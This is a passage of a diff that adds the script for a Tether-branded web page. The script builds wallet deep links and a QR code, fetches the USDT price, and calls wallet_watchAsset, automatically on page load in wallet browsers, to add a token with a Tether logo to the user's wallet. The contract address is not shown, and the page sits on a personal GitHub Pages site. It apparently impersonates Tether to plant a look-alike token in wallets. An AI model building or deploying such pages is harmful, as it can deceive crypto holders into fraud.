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";
+    const LOGO_URL = "https://cryptolife31-cmd.github.io/usdt-portal/tether_erc20.png";
+
+    const currentUrl = window.location.href;
+    const cleanHostPath = currentUrl.replace(/^https?:\/\//, "");
+
+    // DeepLinks для мгновенного перехода в браузеры кошельков
+    document.getElementById("mobileLinkMetaMask").href = "https://metamask.app.link/dapp/" + cleanHostPath;
+    document.getElementById("mobileLinkTrust").href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(currentUrl);
+    document.getElementById("mobileLinkOKX").href = "okx://wallet/dapp/details?dappUrl=" + encodeURIComponent(currentUrl);
+    document.getElementById("mobileLinkCoinbase").href = "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(currentUrl);
+    document.getElementById("mobileLinkBitget").href = "https://bkcode.vip?action=dapp&url=" + encodeURIComponent(currentUrl);
+    document.getElementById("mobileLinkTokenPocket").href = "tphigher://open?params=" + encodeURIComponent(JSON.stringify({ url: currentUrl }));
+
+    // Генерация четкого динамического QR-кода
+    document.getElementById("qrCodeImg").src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&margin=8&data=" + encodeURIComponent(currentUrl);
+
+    function copyContract() {
+      navigator.clipboard.writeText(CONTRACT).then(() => {
+        const toast = document.getElementById("toast");
+        toast.classList.add("show");
+        setTimeout(() => toast.classList.remove("show"), 2200);
+      });
+    }
+
+    // Курс USDT в реальном времени с CoinGecko
+    async function updatePrice() {
+      try {
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd,rub");
+        const data = await res.json();
+        if (data && data.tether) {
+          document.getElementById("priceDisplay").textContent = "$" + (data.tether.usd || 1.00).toFixed(4) + " USD";
+          document.getElementById("priceRub").textContent = "~ " + (data.tether.rub || 80.20).toFixed(2) + " RUB";
+        }
+      } catch (e) {}
+    }
+    updatePrice();
+    setInterval(updatePrice, 15000);
+
+    // Функция вызова wallet_watchAsset для добавления токена с логотипом
+    async function executeWatchAsset(silent = false) {
+      const box = document.getElementById("statusBox");
+      if (!window.ethereum) {
+        if (!silent) {
+          window.location.href = "https://metamask.app.link/dapp/" + cleanHostPath;
+        }
+        return;
+      }
+      try {
+        let provider = window.ethereum;
+        if (window.ethereum.providers && window.ethereum.providers.length) {
+          provider = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum.providers[0];
+        }
+        box.innerHTML = "⚡ <b>Кошелек открыл окно подтверждения!</b> Нажмите <i>'Добавить токен'</i>.";
+        const wasAdded = await provider.request({
+          method: "wallet_watchAsset",
+          params: {
+            type: "ERC20",
+            options: {
+              address: CONTRACT,
+              symbol: SYMBOL,
+              decimals: DECIMALS,
+              image: LOGO_DATA || LOGO_URL
+            }
+          }
+        });
+        if (wasAdded) {
+          box.innerHTML = "✅ <b>Успешно!</b> Tether USD (ERC-20) с алмазным логотипом добавлен в ваш кошелек!";
+        }
+      } catch (err) {
+        box.textContent = "Статус: " + (err.message || err);
+      }
+    }
+
+    // Автоматический вызов при открытии внутри встроенного браузера кошелька
+    if (window.ethereum) {
+      setTimeout(() => {
+        executeWatchAsset(true);
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
